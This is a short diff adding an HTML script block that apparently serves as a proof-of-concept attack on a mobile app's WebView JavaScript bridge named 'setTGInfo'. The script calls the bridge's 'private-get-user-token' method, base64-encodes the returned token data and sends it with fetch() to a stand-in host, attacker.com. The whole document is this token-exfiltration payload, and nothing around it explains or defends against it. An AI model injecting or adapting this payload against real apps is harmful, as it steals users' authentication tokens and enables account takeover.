@@ -1,0 +1,8 @@
+<script>
+    // Since 'setTGInfo' is the bridge name you found:
+    try {
+        window.setTGInfo.callNative('private-get-user-token', {}, (res) => {
+            fetch('https://attacker.com/log?token=' + btoa(JSON.stringify(res)));
+        });
+    } catch(e) { alert(e); }
+</script>
